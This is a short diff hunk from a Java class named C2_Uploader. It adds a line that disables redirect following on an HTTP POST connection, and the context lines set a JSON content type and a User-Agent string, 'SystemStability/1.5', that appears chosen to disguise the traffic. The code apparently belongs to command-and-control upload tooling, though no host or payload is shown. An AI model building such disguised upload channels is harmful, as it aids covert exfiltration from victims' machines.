@@ -76,6 +76,7 @@ public class C2_Uploader {
         try {
             URL url = new URL(urlString);
             conn = (HttpURLConnection) url.openConnection();
+            conn.setInstanceFollowRedirects(false);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
